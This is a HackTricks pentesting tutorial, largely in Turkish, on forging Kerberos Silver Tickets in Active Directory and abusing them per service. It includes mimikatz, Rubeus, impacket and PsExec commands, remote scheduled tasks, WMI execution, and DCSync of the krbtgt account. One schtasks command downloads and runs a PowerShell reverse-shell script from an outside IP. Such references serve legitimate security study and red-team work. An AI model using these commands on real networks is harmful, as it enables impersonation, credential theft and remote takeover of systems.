# Silver Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin istismarını içerir. Bu yöntem, bir hizmet hesabının NTLM hash'ini, örneğin bir bilgisayar hesabı, elde etmeye dayanır ve böylece bir Ticket Granting Service (TGS) bileti oluşturulur. Bu sahte bilet ile bir saldırgan, genellikle yönetici ayrıcalıkları hedefleyerek, ağdaki belirli hizmetlere **herhangi bir kullanıcıyı taklit ederek** erişebilir. Biletleri sahtelemek için AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.

Bilet oluşturma için, işletim sistemine bağlı olarak farklı araçlar kullanılmaktadır:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, kurbanın dosya sistemine erişim için yaygın bir hedef olarak öne çıkmaktadır, ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.

## Mevcut Hizmetler

| Hizmet Türü                                | Hizmet Gümüş Biletleri                                                   |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Uzak Bağlantı                  | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece şunu isteyebilirsiniz: WINRM</p> |
| Zamanlanmış Görevler                      | HOST                                                                   |
| Windows Dosya Paylaşımı, ayrıca psexec    | CIFS                                                                   |
| LDAP işlemleri, DCSync dahil              | LDAP                                                                   |
| Windows Uzak Sunucu Yönetim Araçları      | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Altın Biletler                             | krbtgt                                                                 |

**Rubeus** kullanarak bu biletlerin hepsini şu parametre ile **isteyebilirsiniz**:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Gümüş biletler Olay Kimlikleri

* 4624: Hesap Girişi
* 4634: Hesap Çıkışı
* 4672: Yönetici Girişi

## Hizmet biletlerini kötüye kullanma

Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu bilet ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden erişim sağlayabilir (eğer açığa çıkmışlarsa) ve uzaktaki dosya sisteminin bir kısmına dosyaları kopyalayabilirsiniz, sadece şunu yaparak:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca, **psexec** kullanarak ana bilgisayar içinde bir shell elde edebilir veya rastgele komutlar çalıştırabilirsiniz:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Bu izinle, uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve rastgele komutlar çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu biletlerle **kurban sisteminde WMI'yi çalıştırabilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Daha fazla bilgi için **wmiexec** hakkında aşağıdaki sayfayı inceleyin:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Winrm erişimi ile bir bilgisayara **erişebilir** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Aşağıdaki sayfayı kontrol ederek **winrm kullanarak uzaktan bir host ile bağlantı kurmanın daha fazla yolunu** öğrenin:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
**winrm'nin uzaktaki bilgisayarda aktif ve dinliyor olması gerektiğini** unutmayın.
{% endhint %}

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:

## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, **hackerlar tarafından, hackerlar için oluşturulmuş premium bir hata ödülü platformu**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katılın ve **$100,000**'a kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
